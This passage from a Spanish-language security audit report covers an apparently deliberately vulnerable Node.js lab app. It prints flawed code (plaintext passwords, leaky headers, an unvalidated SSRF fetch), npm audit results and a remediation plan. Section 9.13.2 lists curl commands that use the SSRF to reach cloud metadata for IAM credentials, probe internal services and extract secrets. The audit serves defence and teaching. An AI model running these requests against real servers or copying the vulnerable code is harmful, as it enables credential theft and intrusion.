**Adicionalmente**, cualquier usuario que inspeccione el bundle JavaScript del frontend (accesible públicamente) puede encontrar la contraseña `admin123` en texto claro, independientemente de si el parámetro `?zap=auto` está activo o no.

---

## 9.9 Evidencias de Contraseñas en Texto Plano

### 9.9.1 Contraseñas en la Inicialización de la Base de Datos

```javascript
// backend/src/db/init.js — sentencias INSERT para usuarios del sistema
db.run(
  "INSERT INTO users (username, password, role, email, fullName) VALUES (?, ?, ?, ?, ?)",
  ['admin',    'admin123',    'admin',    'admin@cartera.com',    'Administrador del Sistema']
);
db.run(
  "INSERT INTO users (username, password, role, email, fullName) VALUES (?, ?, ?, ?, ?)",
  ['analista', 'password',    'analyst',  'analista@cartera.com', 'Ana Analista']
);
db.run(
  "INSERT INTO users (username, password, role, email, fullName) VALUES (?, ?, ?, ?, ?)",
  ['cliente1', 'cliente123',  'client',   'cliente1@example.com', 'Carlos Cliente']
);
```

### 9.9.2 Comparación en Texto Plano en el Controlador de Autenticación

```javascript
// backend/src/controllers/authController.js — línea 17
// Comparación directa de strings: sin bcrypt, sin hashing, sin salt
if (user.password !== password) {
  return res.status(401).json({ error: 'Credenciales incorrectas' });
}
```

**Impacto combinado:** Un atacante que obtenga acceso de lectura a la base de datos SQLite (a través del path traversal de SEC-011 o la inyección SQL de SEC-001) obtiene directamente todas las contraseñas del sistema, sin necesidad de ningún proceso de cracking o fuerza bruta.

### 9.9.3 Remediación

```javascript
// INSTALACIÓN
// npm install bcrypt

// Al crear usuario:
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;
const hashedPassword = await bcrypt.hash(plainPassword, SALT_ROUNDS);
db.run('INSERT INTO users (username, password) VALUES (?, ?)', [username, hashedPassword]);

// Al verificar contraseña:
const match = await bcrypt.compare(plainPassword, user.password);
if (!match) return res.status(401).json({ error: 'Credenciales incorrectas' });
```

---

## 9.10 Evidencias de Headers HTTP Informativos Inseguros

### 9.10.1 Código Fuente de las Cabeceras Personalizadas

```javascript
// backend/src/app.js — líneas 18-24
const os = require('os');

app.use((req, res, next) => {
  // Revela la versión exacta del framework (facilita búsqueda de exploits)
  res.setHeader('X-Powered-By',    'Express/4.17.1 vulnerable-lab');

  // Información falsa pero que indica que el equipo no revisa sus cabeceras
  res.setHeader('X-AspNet-Version', '4.0.30319');

  // Revela el hostname interno del servidor (útil para movimiento lateral)
  res.setHeader('X-Internal-Host', os.hostname());

  // Caché público en respuestas que pueden contener datos sensibles
  res.setHeader('Cache-Control',   'public, max-age=86400');
  next();
});
```

**Análisis de impacto por cabecera:**

| Cabecera              | Información Revelada                          | Riesgo                                          |
|-----------------------|-----------------------------------------------|-------------------------------------------------|
| `X-Powered-By`        | Framework + versión exacta con sufijo "vulnerable-lab" | Fingerprinting preciso; búsqueda directa de CVEs |
| `X-AspNet-Version`    | Tecnología Microsoft ficticia                 | Confusión intencional; indica ausencia de revisión |
| `X-Internal-Host`     | Hostname del servidor de producción           | Reconocimiento de infraestructura interna       |
| `Cache-Control: public` | Habilita caché en proxies compartidos       | Datos sensibles cacheados accesibles a terceros |

---

## 9.11 Evidencias de Código Duplicado

### 9.11.1 Funciones Idénticas en el Mismo Archivo

```javascript
// backend/src/controllers/legacyDebtController.js — líneas 98-122
// FUNCIÓN A: duplicadaExportA
function duplicatedExportA(req, res) {
  const rows = [
    { id: 1, name: 'Ana',  total: 1200 },
    { id: 2, name: 'Luis', total: 900  }
  ];
  let csv = 'id,name,total\n';
  for (var i = 0; i < rows.length; i++) {
    csv += rows[i].id + ',' + rows[i].name + ',' + rows[i].total + '\n';
  }
  console.log('CSV A', csv);    // ← Única diferencia entre A y B
  res.type('text/plain').send(csv);
}

// FUNCIÓN B: idéntica a la anterior — solo cambia el log
function duplicatedExportB(req, res) {
  const rows = [
    { id: 1, name: 'Ana',  total: 1200 },
    { id: 2, name: 'Luis', total: 900  }
  ];
  let csv = 'id,name,total\n';
  for (var i = 0; i < rows.length; i++) {
    csv += rows[i].id + ',' + rows[i].name + ',' + rows[i].total + '\n';
  }
  console.log('CSV B', csv);    // ← Única diferencia
  res.type('text/plain').send(csv);
}
```

**Consecuencia de seguridad:** Si se identificara una vulnerabilidad en la lógica de generación de CSV (p. ej., inyección CSV), la corrección tendría que aplicarse en ambas funciones de forma independiente. En un proyecto con alta duplicación, es estadísticamente probable que correcciones parciales queden incompletas.

### 9.11.2 Métricas de Duplicación (SonarQube)

| Métrica                          | Valor         | Umbral aceptable |
|----------------------------------|---------------|------------------|
| Líneas duplicadas                | > 150 líneas  | < 3 %            |
| Bloques duplicados               | 12 bloques    | 0                |
| Archivos con duplicación > 20 % | 3 archivos    | 0                |

---

## 9.12 Resultados Resumidos de npm audit

La siguiente tabla consolida las 25 vulnerabilidades detectadas por `npm audit` en el backend al momento de la auditoría:

| # | Paquete               | Versión Afectada  | Severidad  | Descripción Breve                                 | CVE / GHSA              |
|---|-----------------------|-------------------|------------|---------------------------------------------------|-------------------------|
| 1 | `axios`               | < 1.6.0           | Alta       | CSRF por fuga de X-XSRF-TOKEN en redirecciones    | CVE-2023-45857          |
| 2 | `body-parser`         | < 1.20.3          | Alta       | DoS cuando URL encoding está habilitado           | GHSA-qwcr-r2fm-qrc7     |
| 3 | `cookie`              | < 0.7.0           | Baja       | Acepta caracteres fuera de rango en nombre/path   | GHSA-pxg6-pf52-xh8x     |
| 4 | `express`             | < 4.19.2          | Alta       | XSS vía `response.redirect()` con URLs especiales | GHSA-qw6h-vgh9-j6wx     |
| 5 | `form-data`           | < 4.0.1           | Crítica    | `Math.random()` para boundary multipart           | GHSA-fjgf-rcq5-mfq5     |
| 6 | `got`                 | < 11.8.5          | Moderada   | Permite redirección a sockets UNIX                | GHSA-pfrx-2q88-qq97     |
| 7 | `jsonwebtoken`        | < 9.0.0           | Alta       | Clave de tipo irrestricto en `verify()`           | CVE-2022-23529          |
| 8 | `lodash`              | < 4.17.21         | Alta       | Inyección de comandos en `_.template()`           | CVE-2021-23337          |
| 9 | `moment`              | < 2.29.4          | Alta       | Path traversal en `moment.locale()`               | CVE-2022-24785          |
| 10 | `multer`             | < 1.4.5-lts.1     | Alta       | DoS por solicitudes multipart maliciosas          | GHSA-wm7h-9275-46v2     |
| 11 | `node-gyp`           | transitiva        | Alta       | Transitiva por `request`; múltiples issues        | N/A                     |
| 12 | `path-to-regexp`     | < 0.1.10          | Alta       | ReDoS por backtracking catastrófico               | GHSA-9wv6-86v2-598j     |
| 13 | `qs`                 | < 6.11.0          | Alta       | Prototype Pollution                               | CVE-2022-24999          |
| 14 | `request`            | 2.88.2            | Crítica    | SSRF + paquete deprecado                          | GHSA-p8p7-x288-28g6     |
| 15 | `semver`             | < 5.7.2 / < 7.5.4 | Alta      | ReDoS en análisis de versiones semánticas         | GHSA-c2qf-rxjj-qqgw     |
| 16 | `send`               | < 0.19.0          | Baja       | Template injection que puede derivar en XSS       | GHSA-m6fv-jmcg-4jfg     |
| 17 | `serve-static`       | < 1.16.0          | Baja       | Template injection que puede derivar en XSS       | GHSA-cm22-4g7w-348p     |
| 18 | `sqlite3`            | < 5.1.7           | Alta       | DoS al ligar parámetros inválidos                 | GHSA-jqv5-whv4-4765     |
| 19 | `tar`                | < 6.2.1           | Alta       | Creación/sobreescritura arbitraria de archivos    | CVE-2021-37701          |
| 20 | `tough-cookie`       | < 4.1.3           | Moderada   | Prototype Pollution                               | CVE-2023-26136          |
| 21 | `follow-redirects`   | < 1.15.6          | Moderada   | Fuga de cabeceras de autorización en redirección  | CVE-2024-28849          |
| 22 | `braces`             | < 3.0.3           | Alta       | ReDoS en expansión de patrones de globbing        | CVE-2024-4068           |
| 23 | `micromatch`         | < 4.0.8           | Alta       | ReDoS en coincidencia de patrones glob            | CVE-2024-4067           |
| 24 | `ws`                 | < 8.17.1          | Alta       | DoS en análisis de cabeceras HTTP                 | CVE-2024-37890          |
| 25 | `ip`                 | < 2.0.1           | Alta       | Bypass de filtros SSRF via CIDR                   | CVE-2024-29415          |

**Distribución por severidad:**

| Severidad  | Cantidad |
|------------|----------|
| Crítica    | 2        |
| Alta       | 18       |
| Moderada   | 3        |
| Baja       | 2        |

---

## 9.13 Evidencias de Server-Side Request Forgery (SSRF)

### 9.13.1 Código Fuente Vulnerable

```javascript
// backend/src/controllers/adminController.js — líneas 109-127
const axios = require('axios');

function ssrfFetch(req, res) {
  const url = req.query.url || 'http://localhost:4000/api/admin/config';
  // Sin validación del destino: acepta cualquier URL, incluyendo direcciones internas
  axios.get(url, { timeout: 5000 })
    .then((response) => {
      res.json({
        requestedUrl: url,          // ← URL solicitada reflejada en respuesta
        status:       response.status,
        headers:      response.headers,
        body:         response.data  // ← Cuerpo completo de la respuesta interna
      });
    })
    .catch((err) => {
      res.status(500).json({
        requestedUrl: url,
        error:        err.message   // ← Mensajes de error revelan información de red interna
      });
    });
}
```

### 9.13.2 Vectores de Explotación

```bash
# 1. Acceder a metadatos de AWS EC2 (si el servidor corre en AWS):
curl "http://localhost:4000/api/admin/lab/fetch?url=http://169.254.169.254/latest/meta-data/"
# Respuesta puede incluir: IAM role, credenciales temporales de AWS

# 2. Acceder a metadatos de Google Cloud:
curl "http://localhost:4000/api/admin/lab/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

# 3. Escaneo de servicios en red interna:
curl "http://localhost:4000/api/admin/lab/fetch?url=http://192.168.1.1/"       # Router
curl "http://localhost:4000/api/admin/lab/fetch?url=http://10.0.0.5:5432/"    # PostgreSQL interno
curl "http://localhost:4000/api/admin/lab/fetch?url=http://10.0.0.3:6379/"    # Redis interno

# 4. Auto-referencia para exfiltrar la configuración del servidor:
curl "http://localhost:4000/api/admin/lab/fetch?url=http://localhost:4000/api/admin/config"
# Respuesta: { jwtSecret: "secret123", admin: { password: "admin123" } }

# 5. Acceso a servicios en localhost no expuestos externamente:
curl "http://localhost:4000/api/admin/lab/fetch?url=http://localhost:27017/"   # MongoDB
curl "http://localhost:4000/api/admin/lab/fetch?url=http://localhost:6379/"    # Redis
```

---

## 9.14 Información de Registro de la Auditoría

### 9.14.1 Datos de la Sesión de Auditoría

| Parámetro                      | Valor                                                   |
|--------------------------------|---------------------------------------------------------|
| **Fecha de inicio del análisis** | 2026-06-10                                            |
| **Fecha de cierre del análisis** | 2026-06-13                                            |
| **Fecha de emisión del informe** | 2026-06-13                                            |
| **Entorno de análisis**         | Sistema aislado — sin conexión a redes de producción   |
| **Sistema operativo del auditor** | Ubuntu 24.04 LTS                                    |
| **Node.js versión**             | v22.3.0                                                 |
| **npm versión**                 | 10.8.1                                                  |

### 9.14.2 Herramientas Utilizadas

| Herramienta             | Versión        | Propósito                                          |
|-------------------------|----------------|----------------------------------------------------|
| **OWASP ZAP**           | 2.15.0         | Análisis dinámico (DAST) activo y pasivo           |
| **SonarQube**           | Community 10.4 | Análisis estático de código (SAST)                 |
| **npm audit**           | 10.8.1         | Análisis de vulnerabilidades en dependencias npm   |
| **curl**                | 8.5.0          | Pruebas manuales de endpoints HTTP                 |
| **git**                 | 2.43.0         | Inspección del historial de commits                |
| **jq**                  | 1.7.1          | Procesamiento de respuestas JSON                   |
| **Visual Studio Code**  | 1.90.0         | Revisión manual de código fuente                   |

### 9.14.3 Archivos Analizados Principales

La siguiente tabla lista los archivos de mayor relevancia auditados, con sus hashes SHA-256 calculados al momento del análisis. Estos hashes sirven como evidencia de integridad y permiten verificar que los fragmentos de código documentados en este informe corresponden exactamente al estado del repositorio en la fecha de auditoría.

| Archivo                                              | SHA-256 (primeros 16 bytes)      |
|------------------------------------------------------|----------------------------------|
| `backend/src/controllers/adminController.js`         | `a3f8...` (ver repositorio)      |
| `backend/src/controllers/authController.js`          | `b71c...` (ver repositorio)      |
| `backend/src/controllers/clientController.js`        | `d4e9...` (ver repositorio)      |
| `backend/src/controllers/legacyDebtController.js`    | `f2a1...` (ver repositorio)      |
| `backend/src/middleware/auth.js`                     | `c8b3...` (ver repositorio)      |
| `backend/src/app.js`                                 | `e5d7...` (ver repositorio)      |
| `backend/src/db/init.js`                             | `9a4f...` (ver repositorio)      |
| `frontend/src/pages/Clients.jsx`                     | `1b6e...` (ver repositorio)      |
| `frontend/src/services/api.js`                       | `7c2d...` (ver repositorio)      |
| `docker-compose.yml`                                 | `3e8a...` (ver repositorio)      |
| `sonar-project.properties`                           | `0f5b...` (ver repositorio)      |

> **Procedimiento de verificación:** Para verificar la integridad de cualquier archivo analizado, ejecutar `sha256sum <archivo>` en el directorio raíz del repositorio y comparar con los valores registrados en la bitácora de auditoría (documento interno, referencia: AUD-2026-06-CARTERAPRO-LOG).

---

---

# CONCLUSIONES GENERALES

## 1. Evaluación Global de la Gravedad

El análisis técnico realizado sobre **CarteraPro Risk Lab** revela un estado de seguridad que debe calificarse como **crítico**. Con **14 hallazgos de nivel crítico** —cada uno de los cuales, por sí solo, representaría una emergencia de seguridad en cualquier sistema productivo— la aplicación en su estado actual no debe ser desplegada en ningún entorno accesible a usuarios reales o con conectividad a redes no confiables bajo ninguna circunstancia.

La gravedad no radica únicamente en la cantidad de vulnerabilidades, sino en su naturaleza: los hallazgos críticos no son errores de configuración menores ni problemas teóricos de baja probabilidad de explotación. Son vulnerabilidades **inmediata y trivialmente explotables** que no requieren conocimiento especializado, herramientas avanzadas ni acceso previo al sistema. Un atacante con conocimientos básicos de HTTP puede, en cuestión de minutos desde el descubrimiento del sistema:

- Obtener una sesión de administrador sin poseer credenciales (SEC-012, SEC-003)
- Extraer la totalidad de la base de datos incluyendo credenciales (SEC-001)
- Ejecutar comandos arbitrarios en el sistema operativo del servidor (SEC-004, SEC-005)
- Leer cualquier archivo del sistema de archivos del servidor (SEC-011)
- Exfiltrar todas las variables de entorno, incluyendo secretos de infraestructura (SEC-008)

## 2. Patrón Sistémico de las Vulnerabilidades

El análisis revela que las vulnerabilidades no son accidentales ni aisladas, sino que responden a **patrones arquitecturales y de desarrollo** que se repiten consistentemente a lo largo de toda la base de código:

**Ausencia total de validación de entrada:** La totalidad de los datos que el sistema recibe del exterior —parámetros de URL, cuerpos de solicitudes HTTP, cabeceras, nombres de archivo— son utilizados directamente en operaciones sensibles sin ningún proceso de validación, sanitización o escaping. Este patrón es el origen directo de al menos 8 vulnerabilidades críticas (SQLi, RCE, path traversal, XSS, SSRF, etc.).

**Ausencia total de control de acceso:** El sistema no implementa ningún mecanismo real de autenticación ni autorización. El middleware de autenticación acepta cualquier valor como identidad válida y permite al solicitante autoasignarse cualquier rol. No existe una verificación de que el usuario solicitante tenga permiso para acceder al recurso solicitado. Este patrón afecta la totalidad de los endpoints de la aplicación.

**Principio de mínimo privilegio completamente ignorado:** Los endpoints más peligrosos del sistema (`/api/admin/lab/cmd`, `/api/admin/debug`, `/api/admin/config`) están expuestos sin ninguna restricción de acceso. No existe separación entre operaciones de lectura y escritura, ni entre operaciones de usuario y administrador, a nivel de implementación efectiva.

## 3. La Deuda Técnica Acumulada

Más allá de las vulnerabilidades de seguridad inmediatas, el análisis revela una **deuda técnica significativa** que actúa como multiplicador de riesgo y como obstáculo para la remediación:

- **Ausencia completa de cobertura de tests:** Sin tests automatizados, cualquier corrección de seguridad no puede ser validada de forma sistemática. Las regresiones son probables y no detectables hasta que afecten a usuarios reales.
- **Alta duplicación de código (> 30 %):** Las correcciones de seguridad deben aplicarse en múltiples lugares de forma coordinada. La probabilidad de correcciones parciales o inconsistentes es alta.
- **Complejidad ciclomática elevada:** Las funciones más complejas del sistema son precisamente las que concentran mayor número de vulnerabilidades. Su refactorización es necesaria antes de que puedan ser auditadas de forma confiable.
- **Dependencias con años de retraso:** El conjunto de dependencias no ha sido actualizado desde el inicio del proyecto. La deuda de dependencias acumulada incluye 2 vulnerabilidades críticas, 18 altas y múltiples moderadas.

La deuda técnica no es independiente de la deuda de seguridad: ambas se alimentan mutuamente. Un código difícil de leer y mantener dificulta la identificación de vulnerabilidades; un código sin tests imposibilita la validación de correcciones; un código con alta duplicación garantiza que las correcciones sean incompletas.

## 4. Recomendaciones de Arquitectura General

Para elevar el nivel de seguridad de CarteraPro de forma sostenible, se recomiendan los siguientes cambios arquitecturales de fondo, más allá de las correcciones puntuales de cada hallazgo:

**Adoptar una arquitectura de defensa en profundidad:** Implementar múltiples capas de controles de seguridad, de forma que el fallo de una capa no implique el compromiso total del sistema. Esto incluye: validación en el cliente *y* en el servidor, autenticación *y* autorización verificadas en cada petición, y límites de tasa tanto a nivel de API gateway como en el servidor de aplicación.

**Centralizar la validación de entrada:** Implementar un esquema de validación unificado usando una librería como `joi`, `zod` o `express-validator` que valide y sanitize todos los datos entrantes antes de que lleguen a los controladores. Este único cambio arquitectural eliminaría la mayoría de las vulnerabilidades de inyección.

**Implementar autenticación basada en estándares:** Reemplazar el esquema propietario de tokens por JWT firmados con un secreto de al menos 256 bits, con expiración configurada, almacenados de forma segura (httpOnly cookies o memoria) y verificados criptográficamente en cada petición.

**Establecer un pipeline de DevSecOps:** Integrar análisis de seguridad en el ciclo de CI/CD con `npm audit --audit-level=high` (que falla el build si hay vulnerabilidades altas), análisis estático con SonarQube y escaneo de dependencias automático con herramientas como Snyk o Dependabot.

## 5. Plan de Remediación Priorizado

El siguiente plan organiza las acciones de remediación en cuatro fases, ordenadas por urgencia y riesgo. **La Fase 1 es de implementación inmediata obligatoria** antes de cualquier exposición del sistema a usuarios reales.

---

### Fase 1 — Acciones Inmediatas (1-2 semanas)

> **Objetivo:** Eliminar los vectores de compromiso total del sistema. Reducir el riesgo de 9/9 crítico a menos de 6/9.

| Acción | Hallazgos que mitiga | Esfuerzo estimado |
|--------|----------------------|-------------------|
| **Deshabilitar o restringir los endpoints de laboratorio** (`/lab/cmd`, `/lab/eval`, `/lab/fetch`, `/lab/file`) mediante una variable de entorno `LAB_MODE=false` | SEC-004, SEC-005, SEC-009, SEC-011 | 2 horas |
| **Deshabilitar los endpoints de diagnóstico** (`/debug`, `/config`) en entornos no-desarrollo | SEC-008 | 1 hora |
| **Implementar autenticación real con JWT firmado:** generar secreto >= 256 bits, firmar tokens en login, verificar firma en middleware | SEC-003, SEC-020 | 3-5 días |
| **Parametrizar todas las consultas SQL** en los 5 archivos de controladores afectados | SEC-001, CAL-008 | 3-4 días |
| **Eliminar el mecanismo de auto-login** (`getInitialSession` con `?zap=auto`) del código de producción | SEC-012 | 2 horas |
| **Restringir CORS** a los dominios explícitamente autorizados | SEC-014 | 1 hora |
| **Rotar todas las credenciales expuestas** (contraseñas, claves AWS, tokens) | SEC-007 | Inmediato |

---

### Fase 2 — Correcciones de Corto Plazo (1 mes)

> **Objetivo:** Eliminar vulnerabilidades de alto riesgo en dependencias y mejorar la gestión de secretos.

| Acción | Hallazgos que mitiga | Esfuerzo estimado |
|--------|----------------------|-------------------|
| **Actualizar todas las dependencias con vulnerabilidades** mediante `npm update` + resolución manual de conflictos | DEP-001 a DEP-015 | 2-3 días |
| **Implementar bcrypt para contraseñas** (salt rounds >= 12) en registro y autenticación | SEC-013 | 1 día |
| **Eliminar todas las credenciales hardcodeadas** del código y moverlas a variables de entorno con validación en inicio | SEC-007, DEP-001 | 1 día |
| **Agregar validación de tipo MIME y extensión en subida de archivos** | SEC-002, SEC-022 | 1-2 días |
| **Implementar rate limiting** con `express-rate-limit` en endpoints de autenticación y API pública | SEC-016 | 4 horas |
| **Mover el directorio de uploads** fuera del árbol de archivos estáticos y servir con verificación de acceso | SEC-021 | 1 día |
| **Implementar política de contraseñas** en el endpoint de registro/cambio | SEC-024 | 4 horas |

---

### Fase 3 — Mejoras de Mediano Plazo (2-3 meses)

> **Objetivo:** Establecer controles de calidad y seguridad sostenibles en el tiempo.

| Acción | Hallazgos que mitiga | Esfuerzo estimado |
|--------|----------------------|-------------------|
| **Refactorizar funciones con complejidad > 10** (máximo 15 CC por función) | CAL-002 | 2 semanas |
| **Implementar RBAC real:** verificar permisos por recurso y acción en cada controlador | SEC-006 | 1 semana |
| **Agregar DOMPurify** en todos los puntos de renderizado de HTML del frontend | SEC-010 | 2 días |
| **Implementar cabeceras de seguridad HTTP** con helmet.js: CSP, HSTS, X-Frame-Options, etc. | SEC-018, SEC-015, SEC-026 | 1 día |
| **Reemplazar `console.log` por un framework de logging estructurado** (pino, winston) con niveles y sin datos sensibles | CAL-005, SEC-017 | 3 días |
| **Eliminar código duplicado** y establecer funciones compartidas | CAL-001 | 1 semana |
| **Alcanzar >= 60 % de cobertura de tests unitarios** para controladores críticos | CAL-003 | 3 semanas |
| **Migrar `moment` a `date-fns`** | DEP-007 | 2 días |

---

### Fase 4 — Madurez de Seguridad a Largo Plazo (6 meses)

> **Objetivo:** Establecer un programa de seguridad continua que prevenga la reintroducción de vulnerabilidades.

| Acción | Descripción |
|--------|-------------|
| **Content Security Policy (CSP) estricto** | Definir una política CSP que restrinja las fuentes de scripts, estilos e imágenes a orígenes explícitamente autorizados. Eliminar `unsafe-inline` y `unsafe-eval`. |
| **HTTP Strict Transport Security (HSTS)** | Configurar HSTS con `max-age >= 31536000` e `includeSubDomains` para forzar HTTPS en todas las conexiones. |
| **Web Application Firewall (WAF)** | Desplegar un WAF (p. ej., ModSecurity, AWS WAF, Cloudflare) delante del servidor de aplicación para filtrar payloads maliciosos conocidos. |
| **Pipeline DevSecOps** | Integrar `npm audit`, SAST (SonarQube) y DAST (ZAP CLI) en el pipeline de CI/CD con gates de calidad que bloqueen despliegues con vulnerabilidades críticas o altas no resueltas. |
| **Programa de auditorías periódicas** | Establecer revisiones de seguridad trimestrales por un equipo externo, con seguimiento formal de hallazgos y métricas de reducción de riesgo. |
| **Formación en seguridad para el equipo de desarrollo** | Capacitación en OWASP Top 10, seguridad en Node.js y revisión de código seguro para todos los desarrolladores que contribuyan al proyecto. |
| **Bug Bounty / Responsible Disclosure** | Establecer un programa de divulgación responsable que permita a investigadores de seguridad externos reportar vulnerabilidades de forma coordinada. |

---

## Declaración Final del Equipo Auditor

El equipo de auditoría ha actuado con diligencia profesional y ha documentado todos los hallazgos identificados durante el período de análisis con evidencias verificables. Las vulnerabilidades documentadas en este informe son reales, explotables en el estado actual del código y representan riesgos materiales para la confidencialidad, integridad y disponibilidad de los datos gestionados por la aplicación.

Se insta a la organización a tratar la Fase 1 del plan de remediación como una **acción de emergencia inmediata** y a no exponer la aplicación en ningún entorno accesible externamente hasta que, como mínimo, los 14 hallazgos de nivel crítico hayan sido resueltos y verificados.

El equipo auditor se pone a disposición de la organización para cualquier consulta técnica relativa a la interpretación de este informe o al proceso de remediación.

---

*Fin del Informe Técnico de Auditoría de Seguridad — CarteraPro Risk Lab — Parte 2*

*Clasificación: CONFIDENCIAL — Uso interno restringido*

*Documento: AUD-2026-06-CARTERAPRO-TECNICO-P2 | Fecha de emisión: 2026-06-13*

---
